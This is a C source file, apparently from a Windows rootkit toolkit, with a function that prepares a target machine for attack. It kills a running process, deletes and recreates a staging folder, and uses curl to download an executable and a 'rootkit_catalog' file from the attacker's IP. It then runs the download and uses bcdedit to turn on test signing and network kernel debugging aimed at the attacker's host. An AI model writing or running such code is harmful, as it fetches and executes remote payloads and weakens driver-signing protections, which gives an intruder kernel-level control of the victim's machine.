#include "configurations.h"


BOOL FilesAndDebugging(const char* AttackerIp, const char* DebugPort, const char* DebugKey) {
	if (AttackerIp == NULL) {
		printf("[-] Cannot get needed files on target machine - attacker's IP address is not specified!\n");
		return FALSE;
	}
	if (system("taskkill /F /IM MainMedium.exe > nul") == -1) {
		printf("[-] Failed execution of initial termination command of MainMedium.exe - %d\n", GetLastError());
		return FALSE;
	}
	if (system("if exist C:\\nosusfolder rmdir /s /q C:\\nosusfolder > nul") == -1) {
		printf("[-] Failed execution of initial deleting command of nosusfolder - %d\n", GetLastError());
		return FALSE;
	}

	const char* ReplaceArr[3] = { AttackerIp, DebugPort, DebugKey };
	const char* SymbolsArr = "~`\'";
	const int TotalCommands = 7;
	const char* FileCommands[TotalCommands] = {
		"if not exist C:\\nosusfolder\\verysus mkdir C:\\nosusfolder\\verysus && ",
		"curl http://~:8080/WebScraper/x64/Release/WebScraper.exe --output C:\\nosusfolder\\verysus\\WebScraper.exe && ",
		"curl http://~:8080/rootkit_catalog.txt --output C:\\nosusfolder\\verysus\\rootkit_catalog.txt && ",
		"C:\\nosusfolder\\verysus\\WebScraper.exe C:\\nosusfolder\\verysus\\rootkit_catalog.txt ~ && ",
		"bcdedit /set TESTSIGNING ON > nul && ",
		"bcdedit /set DEBUG ON > nul && ",
		"bcdedit /dbgsettings NET HOSTIP:~ PORT:` KEY:\' > nul" };

	return PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 3);
}